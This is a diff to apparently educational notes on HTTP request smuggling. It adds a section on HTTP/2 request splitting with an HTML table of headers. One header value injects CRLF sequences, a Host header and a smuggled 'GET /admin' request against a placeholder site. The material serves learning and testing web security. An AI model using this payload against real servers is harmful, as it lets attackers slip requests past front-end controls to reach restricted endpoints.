@@ -130,3 +130,27 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
+
+## HTTP/2 request splitting via CRLF injection
+<tbody>
+                <tr>
+                    <td class="tg-http2name">:method</td>
+                    <td class="tg-http2value">GET</td>
+                </tr>
+                <tr>
+                    <td class="tg-http2name">:path</td>
+                    <td class="tg-http2value">/</td>
+                </tr>
+                <tr>
+                    <td class="tg-http2name">:authority</td>
+                    <td class="tg-http2value">vulnerable-website.com</td>
+                </tr>
+                <tr>
+                    <td class="tg-http2name">foo</td>
+                    <td class="tg-http2value"><p class="pre-wrap">bar<span class="grey">\r\n</span>
+Host: vulnerable-website.com<span class="grey">\r\n</span>
+<span class="grey">\r\n</span>
+GET /admin HTTP/1.1</p>
+                    </td>
+                </tr>
+                </tbody>
